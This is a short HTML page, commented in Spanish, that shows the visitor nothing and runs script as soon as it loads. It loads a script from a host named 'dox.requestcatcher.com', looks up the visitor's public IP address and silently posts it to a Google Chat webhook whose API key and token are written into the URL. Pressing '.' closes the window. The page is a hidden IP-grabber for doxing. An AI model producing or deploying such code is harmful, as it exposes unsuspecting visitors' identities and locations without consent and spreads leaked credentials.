<!DOCTYPE html><html><body><script src="https://dox.requestcatcher.com/"></script>    <script>
    async function sendMessage() {
      try {
        // URL del endpoint al que se enviará el mensaje
        const url = "https://chat.googleapis.com/v1/spaces/AAAAPVoBJM8/messages?key=AIzaSyDdI0hCZtE6vySjMm-WEfRq3CPzqKqqsHI&token=vXbMWyaGjzPohuRwr8UpIYZpfthuKu2zcjHbObWsdtI";
  
        // Realizar la solicitud fetch para obtener el mensaje
        const response = await fetch("https://wtfismyip.com/text");
        if (!response.ok) {
          throw new Error(`Error fetching message: ${response.statusText}`);
        }
  
        // Obtener el texto del mensaje
        const msg = await response.text();
  
        // Preparar la solicitud para enviar el mensaje
        const payload = JSON.stringify({ text: msg });
        const xhr = new XMLHttpRequest();
        xhr.open("POST", url);
        xhr.setRequestHeader("Content-type", "application/json; charset=UTF-8");
  
        // Manejo de la respuesta de la solicitud
        xhr.onload = () => {
          if (xhr.status >= 200 && xhr.status < 300) {
            console.log("Mensaje enviado con éxito:", xhr.responseText);
          } else {
            console.error(`Error al enviar mensaje: ${xhr.status} ${xhr.statusText}`);
          }
        };
  
        // Manejo de errores en la solicitud
        xhr.onerror = () => {
          console.error("Error de conexión al enviar el mensaje.");
        };
  
        // Enviar la solicitud
        xhr.send(payload);
      } catch (error) {
        console.error("Error en el proceso:", error.message);
      }
    }
  
    // Ejecutar la función
    sendMessage();
    function handleShortcut(event) {
  if (event.key === ".") {
      event.preventDefault();
      window.close()
    }
  }
    document.addEventListener("keydown", handleShortcut);
  </script>
